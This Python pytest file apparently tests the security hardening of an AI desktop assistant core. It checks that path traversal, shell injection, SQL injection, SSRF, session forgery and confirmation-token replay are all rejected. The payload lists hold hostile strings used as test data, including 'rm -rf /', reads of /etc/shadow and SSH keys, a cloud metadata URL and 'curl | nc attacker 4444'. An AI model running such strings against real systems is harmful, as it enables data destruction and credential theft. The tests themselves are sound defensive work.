"""
Adversarial Security Test Suite - Stage 1 Security Hardening Verification.
Validates live defense mechanisms against:
- Path traversal (../)
- Prohibited absolute paths and filesystem roots
- Symlink escapes
- Arbitrary executable launches and command injection
- Agent execution without container isolation
- Unauthorized file deletion & Freedesktop Trash redirection
- Single-use confirmation challenges & parameter tampering
- Secret configuration permissions & masking
- Fail-closed behavior upon security audit logging failure
- SafetyLayer execution gating
- Database PRAGMA key SQL injection prevention
- SSRF loopback and private CIDR blocking
"""
import asyncio
import json
import os
import sys
import tempfile
import time
import socket
import sqlite3
from pathlib import Path
from unittest.mock import patch, AsyncMock, MagicMock

import pytest

from serein_core.command_bus import (
    CommandBus,
    CommandResult,
    CommandStatus,
    PermissionTier,
    validate_safe_path,
    APPROVED_APPLICATIONS,
    PinnedIPResolver,
)
from serein_core.safety_layer import SafetyLayer, PermissionLevel, ActionRisk
from serein_core.config import CoreConfig, AIProviderConfig, mask_secret
from serein_core.agent_sandbox import SandboxManager, SandboxType
from serein_core.database import Database

async def get_test_authenticated_session(
    bus: CommandBus,
    username: str = "adv_admin",
    password: str = "ValidSecurePass123!",
    role: str = "admin",
    expires_in_seconds: float = 86400.0,
) -> str:
    """Helper for tests: registers credentials if needed and authenticates through canonical flow."""
    from serein_core.auth import security_manager
    if username not in security_manager._users:
        security_manager.register_user(username, password, role=role, age_confirmed=True)
    token = await bus.authenticate(username, password, expires_in_seconds=expires_in_seconds)
    assert token is not None, f"Authentication must succeed for valid credentials ({username})"
    return token



# =========================================================================
# 1. Path Traversal and Symlink Sandbox Tests
# =========================================================================

def test_path_traversal_dot_dot_rejected():
    """Attempting path traversal with ../ outside allowed roots must raise PermissionError."""
    traversal_payloads = [
        "../../../../../../etc/passwd",
        "../../../../../../etc/shadow",
        "~/Documents/../../etc/passwd",
        "~/../../etc/shadow",
    ]
    for payload in traversal_payloads:
        with pytest.raises((PermissionError, ValueError)):
            validate_safe_path(payload, operation="read")


def test_absolute_paths_outside_permitted_roots_rejected():
    """Attempting to access system directories directly must be blocked."""
    prohibited_roots = [
        "/etc/passwd",
        "/etc/shadow",
        "/boot/vmlinuz",
        "/bin/sh",
        "/usr/bin/python3",
        "~/.ssh/id_rsa",
        "~/.gnupg/secring.gpg",
    ]
    for path in prohibited_roots:
        with pytest.raises((PermissionError, ValueError)):
            validate_safe_path(path, operation="read")


def test_symlink_escape_rejected(tmp_path):
    """A symlink inside an allowed directory pointing to a prohibited path must be rejected."""
    # Create fake target outside allowed workspace
    outside_dir = tmp_path / "outside_prohibited"
    outside_dir.mkdir()
    target_secret = outside_dir / "secret.key"
    target_secret.write_text("SUPER_SECRET_PAYLOAD", encoding="utf-8")

    # Create workspace inside user Documents or tmp
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    symlink_file = workspace / "innocent_link.txt"

    try:
        symlink_file.symlink_to(target_secret)
    except (OSError, NotImplementedError):
        pytest.skip("Symlink creation requires administrative privileges on Windows")

    with pytest.raises(PermissionError):
        validate_safe_path(str(symlink_file), operation="read")


# =========================================================================
# 2. Application Whitelisting & Injection Prevention Tests
# =========================================================================

@pytest.mark.asyncio
async def test_arbitrary_executable_launch_rejected():
    """Attempting to launch unapproved binaries must return CommandStatus.DENIED."""
    bus = CommandBus(allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.REVERSIBLE})
    
    unapproved_apps = [
        "rm",
        "/bin/rm",
        "curl",
        "nc",
        "bash",
        "powershell",
        "calc.exe",
    ]
    for bad_app in unapproved_apps:
        res = await bus.execute("launch_app", {"app": bad_app})
        assert res.status is CommandStatus.DENIED
        assert "not in approved application whitelist" in res.error


@pytest.mark.asyncio
async def test_launch_app_command_injection_rejected():
    """App launches containing shell metacharacters must be rejected immediately."""
    bus = CommandBus(allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.REVERSIBLE})
    
    injections = [
        "terminal; rm -rf /",
        "terminal && id",
        "terminal | whoami",
        "terminal`reboot`",
        "terminal$(reboot)",
        "terminal\nreboot",
    ]
    for inj in injections:
        res = await bus.execute("launch_app", {"app": inj})
        assert res.status is CommandStatus.DENIED
        assert "Command injection detected" in res.error


# =========================================================================
# 3. Agent Execution Without Container Isolation Test
# =========================================================================

@pytest.mark.asyncio
async def test_agent_execution_without_container_isolation_rejected(tmp_path):
    """Agent sandbox must refuse to execute commands directly on host without Docker/Podman."""
    mgr = SandboxManager(sandbox_type=SandboxType.LOCAL)
    sandbox_id = await mgr.create_sandbox("task_123", tmp_path)
    
    # Executing command in local sandbox must raise PermissionError
    with pytest.raises(PermissionError, match="lacks container isolation"):
        await mgr.execute_in_sandbox(sandbox_id, ["echo", "hello"])


# =========================================================================
# 4. File Deletion and Freedesktop Trash Redirection
# =========================================================================

@pytest.mark.asyncio
async def test_user_file_deletion_redirects_to_trash(tmp_path):
    """File deletion in user directories must move to Trash, not unlink permanently."""
    bus = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        dry_run=False
    )
    
    # Create test file inside user Documents area
    user_file = tmp_path / "user_test_doc.txt"
    user_file.write_text("Preserve in trash", encoding="utf-8")
    
    sess = await get_test_authenticated_session(bus)
    # Confirmation token request
    req = await bus.execute("delete_file", {"path": str(user_file)}, session_id=sess)
    assert req.status is CommandStatus.CONFIRMATION_REQUIRED
    assert req.challenge_id is not None
    
    # Confirm deletion
    with patch("send2trash.send2trash") as mock_trash:
        conf = await bus.confirm(req.challenge_id, approved=True, session_id=sess)
        assert conf.success is True
        assert "trashed" in conf.result
        # send2trash was called to protect user file
        mock_trash.assert_called_once()


@pytest.mark.asyncio
async def test_scratch_file_deletion_unlinks_directly():
    """Temporary scratch files in /tmp/serein or tempdir/serein may be unlinked directly."""
    bus = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        dry_run=False
    )
    scratch_dir = Path(tempfile.gettempdir()) / "serein"
    scratch_dir.mkdir(parents=True, exist_ok=True)
    scratch_file = scratch_dir / f"scratch_{int(time.time() * 1000)}.tmp"
    scratch_file.write_text("Temporary scratch", encoding="utf-8")
    
    sess = await get_test_authenticated_session(bus)
    req = await bus.execute("delete_file", {"path": str(scratch_file)}, session_id=sess)
    assert req.status is CommandStatus.CONFIRMATION_REQUIRED
    
    conf = await bus.confirm(req.challenge_id, approved=True, session_id=sess)
    assert conf.success is True
    assert "deleted" in conf.result
    assert not scratch_file.exists()


# =========================================================================
# 5. Single-Use Challenges & Parameter Tampering Prevention
# =========================================================================

@pytest.mark.asyncio
async def test_challenge_parameter_tampering_rejected():
    """Submitting confirmation token with altered parameters must be rejected."""
    bus = CommandBus(allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE})
    
    sess = await get_test_authenticated_session(bus)
    # Request token for benign deletion
    req = await bus.execute("delete_file", {"path": "file1.txt"}, session_id=sess)
    token = req.challenge_id
    assert token is not None
    
    # Attacker tries to execute delete_file with token but substituted path
    tampered = await bus.execute("delete_file", {"path": "file2_substituted.txt"}, confirmation_token=token, session_id=sess)
    assert tampered.status is CommandStatus.DENIED
    assert "parameters altered" in tampered.error.lower()


@pytest.mark.asyncio
async def test_challenge_command_substitution_rejected():
    """Submitting token generated for one command to a different command must be rejected."""
    bus = CommandBus(allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE})
    
    sess = await get_test_authenticated_session(bus)
    req = await bus.execute("shutdown", session_id=sess)
    token = req.challenge_id
    assert token is not None
    
    # Attempt to use shutdown token to reboot or delete
    mismatch = await bus.execute("reboot", confirmation_token=token, session_id=sess)
    assert mismatch.status is CommandStatus.DENIED
    assert "command mismatch" in mismatch.error.lower()


@pytest.mark.asyncio
async def test_challenge_is_strictly_single_use():
    """A confirmation challenge cannot be replayed after being consumed or declined."""
    bus = CommandBus(allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE})
    
    sess = await get_test_authenticated_session(bus)
    req = await bus.execute("shutdown", session_id=sess)
    token = req.challenge_id
    
    # Decline once
    dec = await bus.confirm(token, approved=False, session_id=sess)
    assert dec.status is CommandStatus.DENIED
    
    # Second attempt must fail
    replay = await bus.confirm(token, approved=True, session_id=sess)
    assert replay.status is CommandStatus.FAILED


# =========================================================================
# 6. Secret Permissions & Masking Tests
# =========================================================================

def test_secret_file_permissions(tmp_path):
    """Saving configuration must create file with 0600 permissions."""
    cfg = CoreConfig()
    cfg_file = tmp_path / "config.yaml"
    cfg.to_yaml(cfg_file)
    assert cfg_file.exists()
    
    if os.name != "nt":
        stat_mode = cfg_file.stat().st_mode & 0o777
        assert stat_mode == 0o600


def test_api_key_masking():
    """API keys must be masked when retrieved for telemetry or logs."""
    assert mask_secret(None) == "<not_set>"
    assert mask_secret("") == "<not_set>"
    assert mask_secret("short") == "****"
    assert mask_secret("nvapi-1234567890abcdef") == "nva****cdef"


# =========================================================================
# 7. Fail-Secure Audit Logging Tests
# =========================================================================

@pytest.mark.asyncio
async def test_destructive_action_fails_closed_when_audit_fails():
    """If the audit logger throws an exception, destructive commands must abort."""
    bus = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        dry_run=False
    )
    
    # Use real SQLite database for challenge lifecycle, but mock broken audit logger
    from serein_core.database import get_database
    db = await get_database()
    sess = await get_test_authenticated_session(bus)
    with patch.object(db, "log_action", AsyncMock(side_effect=IOError("Database disk full / write error"))):
        req = await bus.execute("shutdown", session_id=sess)
        token = req.challenge_id
        
        # Confirmation attempt must abort because audit write fails
        result = await bus.confirm(token, approved=True, session_id=sess)
        assert result.status is CommandStatus.FAILED
        assert "Security audit failure" in result.error


# =========================================================================
# 8. SafetyLayer Bypass Prevention Tests
# =========================================================================

@pytest.mark.asyncio
async def test_command_bus_enforces_safety_layer():
    """CommandBus must query SafetyLayer and reject protected paths."""
    safety = SafetyLayer()
    bus = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        safety_layer=safety
    )
    
    # Attempting to read a protected path like /etc/shadow
    res = await bus.execute("read_file", {"path": "/etc/shadow"})
    assert res.status is CommandStatus.DENIED
    err_lower = res.error.lower()
    assert "safety violation" in err_lower or "prohibited" in err_lower or "outside permitted" in err_lower


def test_safetylayer_canonical_path_resolution():
    """SafetyLayer must resolve paths canonically and block traversal."""
    safety = SafetyLayer()
    assert safety._is_protected_path("/etc/passwd") is True
    assert safety._is_protected_path("/bin/bash") is True
    assert safety._is_protected_path("/boot/grub/grub.cfg") is True
    assert safety._is_protected_path("~/.ssh/authorized_keys") is True


# =========================================================================
# 9. Database PRAGMA Key SQL Injection Prevention
# =========================================================================

def test_database_pragma_key_sql_injection_rejected():
    """Hostile SQL characters in encryption_key must be rejected immediately."""
    hostile_keys = [
        "secret'; DROP TABLE users; --",
        "key' OR '1'='1",
        "key\0injected",
        "key--comment",
    ]
    for bad_key in hostile_keys:
        db = Database(encryption_key=bad_key)
        with pytest.raises(ValueError, match="potential SQL injection detected"):
            db._create_connection()


# =========================================================================
# 10. SSRF and DNS Rebinding Protection Tests
# =========================================================================

@pytest.mark.asyncio
async def test_ssrf_loopback_and_private_ranges_blocked():
    """Outbound network requests targeting loopback or private ranges must be blocked."""
    bus = CommandBus(allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.SENSITIVE})
    
    blocked_targets = [
        "http://127.0.0.1:8080/api/secrets",
        "http://localhost:5000",
        "http://169.254.169.254/latest/meta-data/",
        "http://10.0.0.1/admin",
        "http://192.168.1.1/router",
        "http://172.16.0.1/internal",
    ]
    for target in blocked_targets:
        res = await bus.execute("network_request", {"url": target})
        assert res.status is CommandStatus.DENIED
        assert "SSRF blocked" in res.error


# =========================================================================
# 11. Self-Evolution Path Traversal Prevention
# =========================================================================

@pytest.mark.asyncio
async def test_self_evolution_path_traversal_rejected(tmp_path):
    """Self-evolution patch application must reject paths escaping repo root."""
    from serein_core.self_evolution import PatchApplier, Patch, CodeChange, PatchType
    
    repo = tmp_path / "repo"
    repo.mkdir()
    applier = PatchApplier(repo_path=repo)
    
    # 1. Absolute path
    patch_abs = Patch(
        id="patch_abs",
        name="Malicious Absolute Path",
        description="Escape repo",
        patch_type=PatchType.BUG_FIX,
        changes=[CodeChange(file_path="/etc/shadow", old_content="", new_content="root::0:0:::", description="escape")],
    )
    res_abs = await applier.apply(patch_abs)
    assert res_abs.get("success") is False
    assert "error" in res_abs
    assert "forbidden" in res_abs["error"].lower() or "traversal" in res_abs["error"].lower()
    
    # 2. Dot-dot traversal
    patch_traversal = Patch(
        id="patch_dot_dot",
        name="Malicious Dot-Dot Traversal",
        description="Escape repo",
        patch_type=PatchType.BUG_FIX,
        changes=[CodeChange(file_path="../../outside.txt", old_content="", new_content="payload", description="escape")],
    )
    res_traversal = await applier.apply(patch_traversal)
    assert res_traversal.get("success") is False
    assert "error" in res_traversal
    assert "traversal" in res_traversal["error"].lower()


# =========================================================================
# 12. Authenticated Session Enforcement Tests
# =========================================================================

@pytest.mark.asyncio
async def test_missing_or_invalid_authenticated_sessions():
    """When require_session is enabled, unauthenticated or forged sessions must be denied."""
    bus = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        require_session=True,
    )
    
    # 1. Missing session
    res_none = await bus.execute("list_running_apps")
    assert res_none.status is CommandStatus.DENIED
    assert "Missing or invalid authenticated session" in res_none.error
    
    # 2. Forged invalid session
    res_bad = await bus.execute("list_running_apps", session_id="forged_sess_token_999")
    assert res_bad.status is CommandStatus.DENIED
    assert "Missing or invalid authenticated session" in res_bad.error
    
    # 3. Unpersisted in-memory session without SQLite validation must be DENIED (no fail-open fallback)
    from serein_core.auth import security_manager
    test_user = f"user_{int(time.time())}"
    security_manager.register_user(test_user, "SecurePass123!", role="admin", age_confirmed=True)
    unpersisted_sess = security_manager.authenticate(test_user, "SecurePass123!")
    assert unpersisted_sess is not None
    
    # Must be denied because it was never persisted to SQLite
    res_unpersisted = await bus.execute("list_running_apps", session_id=unpersisted_sess.session_token)
    assert res_unpersisted.status is CommandStatus.DENIED
    assert "Missing or invalid authenticated session" in res_unpersisted.error
    
    # 4. Valid authenticated and SQLite-persisted session succeeds
    persisted_token = await bus.authenticate(test_user, "SecurePass123!")
    assert persisted_token is not None
    
    res_valid = await bus.execute("list_running_apps", session_id=persisted_token)
    assert res_valid.success is True
    assert "session" not in (res_valid.error or "").lower()


# =========================================================================
# 13. Persistent SQLite Challenges Across Process Restart
# =========================================================================

@pytest.mark.asyncio
async def test_challenge_persistence_across_process_restart(tmp_path):
    """Confirmation challenges must survive process restart in persistent SQLite."""
    db_file = tmp_path / "persistent_challenges.db"
    db1 = Database(path=db_file)
    await db1.connect()
    
    bus1 = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        database=db1,
    )
    
    sess = await get_test_authenticated_session(bus1)
    # Create challenge on bus 1
    req = await bus1.execute("shutdown", session_id=sess)
    token = req.challenge_id
    assert token is not None
    
    # Simulate process termination: Bus 1 is discarded, fresh Bus 2 connects to DB file
    db2 = Database(path=db_file)
    await db2.connect()
    bus2 = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        database=db2,
    )
    
    # Confirm on Bus 2 using challenge generated on Bus 1 and verified DB auth session
    conf = await bus2.confirm(token, approved=True, session_id=sess)
    assert conf.success is True
    assert conf.result.get("action") == "shutdown"
    
    await db1.close()
    await db2.close()


# =========================================================================
# 14. Concurrent Confirmation Race Protection
# =========================================================================

@pytest.mark.asyncio
async def test_concurrent_confirmation_race_protection(tmp_path):
    """Concurrent attempts to consume the same confirmation challenge must allow exactly one success."""
    db_file = tmp_path / "race_challenges.db"
    db = Database(path=db_file)
    await db.connect()
    
    bus = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        database=db,
    )
    
    sess = await get_test_authenticated_session(bus)
    req = await bus.execute("shutdown", session_id=sess)
    token = req.challenge_id
    assert token is not None
    
    # Launch 5 concurrent coroutines racing to confirm the exact same challenge token
    results = await asyncio.gather(
        bus.confirm(token, approved=True, session_id=sess),
        bus.confirm(token, approved=True, session_id=sess),
        bus.confirm(token, approved=True, session_id=sess),
        bus.confirm(token, approved=True, session_id=sess),
        bus.confirm(token, approved=True, session_id=sess),
        return_exceptions=True
    )
    
    successes = [r for r in results if isinstance(r, CommandResult) and r.success is True]
    denied = [r for r in results if isinstance(r, CommandResult) and (r.status is CommandStatus.DENIED or r.status is CommandStatus.FAILED)]
    
    # Invariant: Exactly one consumer succeeds, all concurrent competitors fail
    assert len(successes) == 1
    assert len(denied) == 4
    
    await db.close()


# =========================================================================
# 15. Challenge Replay Prevention
# =========================================================================

@pytest.mark.asyncio
async def test_challenge_replay_after_consumption():
    """A consumed challenge cannot be replayed via confirm() or direct execute(token)."""
    bus = CommandBus(allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE})
    
    sess = await get_test_authenticated_session(bus)
    req = await bus.execute("shutdown", session_id=sess)
    token = req.challenge_id
    
    # First confirmation succeeds
    conf1 = await bus.confirm(token, approved=True, session_id=sess)
    assert conf1.success is True
    
    # Replay attempt via confirm()
    conf2 = await bus.confirm(token, approved=True, session_id=sess)
    assert conf2.success is False
    assert conf2.status is CommandStatus.FAILED
    assert "already been consumed" in conf2.error
    
    # Replay attempt via direct execute()
    conf3 = await bus.execute("shutdown", confirmation_token=token, session_id=sess)
    assert conf3.success is False
    assert conf3.status is CommandStatus.DENIED
    assert "already" in conf3.error.lower() and "consumed" in conf3.error.lower()


# =========================================================================
# 16. DNS Rebinding PinnedIPResolver Verification
# =========================================================================

@pytest.mark.asyncio
async def test_dns_rebinding_pinned_resolver():
    """PinnedIPResolver must strictly return only the pinned IP, ignoring secondary DNS changes."""
    pinned_ip = "93.184.216.34"
    resolver = PinnedIPResolver(
        hostname="rebind-test.attacker.com",
        pinned_ip=pinned_ip,
        port=443,
        family=socket.AF_INET
    )
    
    records = await resolver.resolve("rebind-test.attacker.com", 443)
    assert len(records) == 1
    assert records[0]["host"] == pinned_ip
    assert records[0]["hostname"] == "rebind-test.attacker.com"


# =========================================================================
# 17. Manual Redirect Revalidation (SSRF to Localhost/Private Blocked)
# =========================================================================

@pytest.mark.asyncio
async def test_redirects_to_localhost_or_private_ips_blocked():
    """Manual redirect loop must inspect destination IP and block redirection to localhost/private IPs."""
    bus = CommandBus(allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.SENSITIVE})
    
    mock_resp_302 = MagicMock()
    mock_resp_302.status = 302
    mock_resp_302.headers = {"Location": "http://127.0.0.1:8000/internal"}
    mock_resp_302.__aenter__ = AsyncMock(return_value=mock_resp_302)
    mock_resp_302.__aexit__ = AsyncMock(return_value=None)
    
    mock_session = MagicMock()
    mock_session.request = MagicMock(return_value=mock_resp_302)
    mock_session.__aenter__ = AsyncMock(return_value=mock_session)
    mock_session.__aexit__ = AsyncMock(return_value=None)
    
    loop = asyncio.get_running_loop()
    async def mock_getaddrinfo(host, port, proto=0):
        if host == "127.0.0.1":
            return [(socket.AF_INET, socket.SOCK_STREAM, proto, "", ("127.0.0.1", port))]
        return [(socket.AF_INET, socket.SOCK_STREAM, proto, "", ("93.184.216.34", port))]
    
    with patch("aiohttp.ClientSession", return_value=mock_session):
        with patch.object(loop, "getaddrinfo", side_effect=mock_getaddrinfo):
            res = await bus.execute("network_request", {"url": "http://public.example.com/start"})
            assert res.status is CommandStatus.DENIED
            assert "SSRF blocked" in res.error
            assert "127.0.0.1" in res.error


# =========================================================================
# 18. SafetyLayer Denial for Non-Path Actions
# =========================================================================

@pytest.mark.asyncio
async def test_safetylayer_denial_for_non_path_actions():
    """SafetyLayer must block non-path actions when required permission is revoked."""
    safety = SafetyLayer()
    safety._permissions["internet"] = PermissionLevel.NONE
    safety._permissions["automation"] = PermissionLevel.NONE
    
    bus = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.SENSITIVE, PermissionTier.DESTRUCTIVE},
        safety_layer=safety,
    )
    
    # 1. Internet permission revoked -> network_request denied
    res_net = await bus.execute("network_request", {"url": "https://example.com"})
    assert res_net.status is CommandStatus.DENIED
    assert "Internet access not granted" in res_net.error
    
    # 2. Automation permission revoked -> shutdown denied outright
    res_sys = await bus.execute("shutdown")
    assert res_sys.status is CommandStatus.DENIED
    assert "Automation access not granted" in res_sys.error


# =========================================================================
# 19. Safety Revalidation After Confirmation
# =========================================================================

@pytest.mark.asyncio
async def test_safety_revalidation_after_confirmation():
    """If permission is revoked after confirmation challenge is generated, revalidation must abort execution."""
    safety = SafetyLayer()
    safety._permissions["automation"] = PermissionLevel.WRITE
    
    bus = CommandBus(
        allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE},
        safety_layer=safety,
    )
    
    sess = await get_test_authenticated_session(bus)
    # Request confirmation while permission is granted
    req = await bus.execute("shutdown", session_id=sess)
    token = req.challenge_id
    assert token is not None
    
    # Revoke permission before user/daemon confirms!
    safety._permissions["automation"] = PermissionLevel.NONE
    
    # Confirm attempt must fail at safety revalidation
    conf = await bus.confirm(token, approved=True, session_id=sess)
    assert conf.success is False
    assert conf.status is CommandStatus.DENIED
    assert "Automation access not granted" in conf.error


# =========================================================================
# 20. Package Installation Hardening Tests
# =========================================================================

@pytest.mark.asyncio
async def test_package_installation_flag_and_command_injection_rejected():
    """Hostile package names (flags, separators, shell metachars) must be rejected."""
    bus = CommandBus(allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE})
    
    hostile_pkgs = [
        "curl; rm -rf /",
        "curl && echo pwned",
        "-o /tmp/pwn",
        "--version",
        "curl | nc attacker 4444",
        "../../bin/malicious",
        "package`id`",
        "package$(whoami)",
    ]
    
    sess = await get_test_authenticated_session(bus)
    for bad_pkg in hostile_pkgs:
        req = await bus.execute("install_package", {"package": bad_pkg}, session_id=sess)
        if req.status is CommandStatus.CONFIRMATION_REQUIRED:
            token = req.challenge_id
            res = await bus.confirm(token, approved=True, session_id=sess)
        else:
            res = req
        assert res.success is False
        assert "Invalid package name" in res.error or "denied" in str(res.status).lower()


# =========================================================================
# 21. Adversarial Confirmation Authentication & Session Binding Tests
# =========================================================================

@pytest.mark.asyncio
async def test_knowing_token_alone_cannot_approve_action_missing_session():
    """
    Adversarial test: An attacker who intercepts or guesses the confirmation challenge token
    CANNOT approve or execute the action without providing the authenticated session that created it.
    """
    bus = CommandBus(allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE})
    victim_session = await get_test_authenticated_session(bus, username="victim_admin")
    
    # Legitimate user requests sensitive action
    req = await bus.execute("shutdown", session_id=victim_session)
    assert req.status is CommandStatus.CONFIRMATION_REQUIRED
    token = req.challenge_id
    assert token is not None
    
    # Attack 1: Attacker attempts confirm() with token but NO session_id (missing session)
    attack1 = await bus.confirm(token, approved=True, session_id=None)
    assert attack1.success is False
    assert attack1.status is CommandStatus.DENIED
    assert "Missing authenticated session" in attack1.error

    # Attack 2: Attacker attempts confirm() with token and empty string session_id
    attack2 = await bus.confirm(token, approved=True, session_id="")
    assert attack2.success is False
    assert attack2.status is CommandStatus.DENIED
    assert "Missing authenticated session" in attack2.error

    # Attack 3: Attacker attempts direct execute() with token and missing session
    attack3 = await bus.execute("shutdown", confirmation_token=token, session_id=None)
    assert attack3.success is False
    assert attack3.status is CommandStatus.DENIED
    assert "Missing authenticated session" in attack3.error

    # Invariant: The challenge must NOT have been consumed by the unauthorized attempts
    db = await bus._get_db()
    chal_row = await db.get_challenge(token)
    assert chal_row["status"] == "pending"

    # Legitimate user supplies verified bound session -> succeeds
    legit = await bus.confirm(token, approved=True, session_id=victim_session)
    assert legit.success is True
    assert legit.result.get("action") == "shutdown"


@pytest.mark.asyncio
async def test_confirmation_rejected_for_forged_session_id():
    """Adversarial test: Attacker providing a fabricated / forged session ID is denied."""
    bus = CommandBus(allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE})
    legit_sess = await get_test_authenticated_session(bus, username="alice")
    
    req = await bus.execute("shutdown", session_id=legit_sess)
    token = req.challenge_id
    
    # Attacker crafts fake session ID
    fake_session = "sess_attacker_forged_token_007"
    
    # Attempt via confirm()
    attack_confirm = await bus.confirm(token, approved=True, session_id=fake_session)
    assert attack_confirm.success is False
    assert attack_confirm.status is CommandStatus.DENIED
    assert "Invalid or expired authenticated session" in attack_confirm.error
    
    # Attempt via direct execute()
    attack_exec = await bus.execute("shutdown", confirmation_token=token, session_id=fake_session)
    assert attack_exec.success is False
    assert attack_exec.status is CommandStatus.DENIED
    assert "Invalid or expired authenticated session" in attack_exec.error


@pytest.mark.asyncio
async def test_confirmation_rejected_for_expired_session():
    """Adversarial test: Confirming with an authenticated session whose TTL has expired is denied."""
    bus = CommandBus(allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE})
    
    # Create an ephemeral session that expires in 0.05 seconds
    short_lived_session = await get_test_authenticated_session(bus, username="ephemeral_user", expires_in_seconds=0.05)
    
    req = await bus.execute("shutdown", session_id=short_lived_session)
    token = req.challenge_id
    assert req.status is CommandStatus.CONFIRMATION_REQUIRED
    
    # Sleep to allow session TTL to expire
    await asyncio.sleep(0.08)
    
    # Attempt confirmation with expired session
    expired_confirm = await bus.confirm(token, approved=True, session_id=short_lived_session)
    assert expired_confirm.success is False
    assert expired_confirm.status is CommandStatus.DENIED
    assert "Invalid or expired authenticated session" in expired_confirm.error


@pytest.mark.asyncio
async def test_cross_session_confirmation_rejected():
    """
    Adversarial test: User B (who has a valid authenticated session) cannot approve
    or execute a confirmation challenge generated by User A.
    """
    bus = CommandBus(allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE})
    sess_user_a = await get_test_authenticated_session(bus, username="user_a")
    sess_user_b = await get_test_authenticated_session(bus, username="user_b")
    
    # User A initiates shutdown
    req = await bus.execute("shutdown", session_id=sess_user_a)
    token = req.challenge_id
    
    # User B (authenticated, but wrong user session) attempts to confirm User A's challenge
    cross_confirm = await bus.confirm(token, approved=True, session_id=sess_user_b)
    assert cross_confirm.success is False
    assert cross_confirm.status is CommandStatus.DENIED
    assert "Session mismatch for confirmation challenge" in cross_confirm.error
    
    # User B attempts direct execute() with User A's token
    cross_exec = await bus.execute("shutdown", confirmation_token=token, session_id=sess_user_b)
    assert cross_exec.success is False
    assert cross_exec.status is CommandStatus.DENIED
    assert "Session mismatch for confirmation challenge" in cross_exec.error
    
    # User A confirms their own challenge -> succeeds
    legit_confirm = await bus.confirm(token, approved=True, session_id=sess_user_a)
    assert legit_confirm.success is True
    assert legit_confirm.result.get("action") == "shutdown"


@pytest.mark.asyncio
async def test_dbus_request_confirmation_session_enforcement():
    """
    D-Bus RequestConfirmation and ExecuteCommand must enforce session verification,
    rejecting unauthenticated callers and mismatched sessions over IPC.
    """
    bus = CommandBus(allowed_tiers={PermissionTier.READ_ONLY, PermissionTier.DESTRUCTIVE})
    sess_owner = await get_test_authenticated_session(bus, username="ipc_owner")
    sess_attacker = await get_test_authenticated_session(bus, username="ipc_attacker")
    
    iface = bus._create_interface()
    
    # 1. Execute sensitive command over D-Bus with owner session -> requires confirmation
    res_raw = await iface.ExecuteCommand.__wrapped__(iface, "shutdown", "{}", "", sess_owner)
    res_data = json.loads(res_raw)
    assert res_data["requires_confirmation"] is True
    token = res_data["confirmation_token"]
    assert token is not None
    
    # 2. D-Bus confirmation with missing session -> rejected
    unauth_raw = await iface.RequestConfirmation.__wrapped__(iface, token, True, "")
    unauth_data = json.loads(unauth_raw)
    assert unauth_data["success"] is False
    assert unauth_data["status"] == "denied"
    assert "Missing authenticated session" in unauth_data["error"]
    
    # 3. D-Bus confirmation with forged session -> rejected
    forged_raw = await iface.RequestConfirmation.__wrapped__(iface, token, True, "sess_fake_9999")
    forged_data = json.loads(forged_raw)
    assert forged_data["success"] is False
    assert forged_data["status"] == "denied"
    assert "Invalid or expired authenticated session" in forged_data["error"]
    
    # 4. D-Bus confirmation with mismatched session (attacker) -> rejected
    cross_raw = await iface.RequestConfirmation.__wrapped__(iface, token, True, sess_attacker)
    cross_data = json.loads(cross_raw)
    assert cross_data["success"] is False
    assert cross_data["status"] == "denied"
    assert "Session mismatch" in cross_data["error"]
    
    # 5. D-Bus confirmation with legitimate owner session -> approved!
    legit_raw = await iface.RequestConfirmation.__wrapped__(iface, token, True, sess_owner)
    legit_data = json.loads(legit_raw)
    assert legit_data["success"] is True
    assert legit_data["status"] == "success"


@pytest.mark.asyncio
async def test_is_valid_session_rejects_conversation_sessions_and_placeholders():
    """
    _is_valid_session() must ONLY validate authenticated user/daemon sessions.
    It must reject conversation_sessions database rows, and unauthenticated placeholders.
    """
    bus = CommandBus()
    db = await bus._get_db()
    
    # Insert a conversation session (dialogue history turn)
    conv_id = "conv_chat_history_9999"
    await db.create_session(session_id=conv_id, summary="Chat turn")
    
    # A conversation_sessions row MUST NOT be accepted as an authenticated session!
    assert await bus._is_valid_session(conv_id) is False
    
    # Placeholders must NOT be accepted!
    assert await bus._is_valid_session("default_session") is False
    assert await bus._is_valid_session("system_local") is False
    assert await bus._is_valid_session("local_console") is False
    assert await bus._is_valid_session("") is False
    assert await bus._is_valid_session(None) is False
    
    # Valid authenticated session in SQLite or SecurityManager MUST be accepted
    auth_sess = await get_test_authenticated_session(bus, username="real_user")
    assert await bus._is_valid_session(auth_sess) is True



@pytest.mark.asyncio
async def test_unauthenticated_session_minting_strictly_prohibited():
    """
    Adversarial test: Calling session-creation helpers without credentials
    is strictly prohibited; neither CommandBus nor SecurityManager exposes
    any unauthenticated session minting helper.
    """
